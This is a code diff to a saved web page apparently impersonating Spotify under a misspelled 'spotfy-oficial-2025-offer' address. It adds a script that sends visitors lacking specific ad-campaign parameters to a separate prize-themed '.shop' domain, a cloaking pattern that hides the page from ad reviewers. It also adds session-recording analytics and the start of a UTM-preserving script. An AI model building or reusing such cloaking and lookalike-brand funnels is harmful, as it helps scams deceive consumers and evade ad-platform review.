@@ -2,6 +2,47 @@
 <!-- saved from url=(0049)https://spotfy-oficial-2025-offer.vercel.app/rate -->
 <html lang="en">
 
+<script type="text/javascript">
+  (function () {
+      /**
+       * Função para verificar a presença de múltiplos parâmetros na URL
+       * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+       * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+       */
+      function hasAllURLParameters(names) {
+          const urlParams = new URLSearchParams(window.location.search);
+          return names.every(param => urlParams.has(param));
+      }
+
+      // Array contendo os parâmetros obrigatórios
+      const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+      // URL para redirecionamento caso algum dos parâmetros não esteja presente
+      const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+      /**
+       * Função principal que verifica os parâmetros da URL
+       * e redireciona o usuário se necessário
+       */
+      function checkURLParameters() {
+          if (!hasAllURLParameters(requiredParams)) {
+              window.location.href = redirectURL;
+          }
+      }
+
+      // Executa a verificação imediatamente assim que o script é carregado
+      checkURLParameters();
+  })();
+</script>
+
+<script type="text/javascript">
+  (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+  })(window, document, "clarity", "script", "qekndxg43i");
+</script>
+
 <script>
   // Script coringa para preservar UTMs em qualquer botão <a>
   document.addEventListener("DOMContentLoaded", function () {
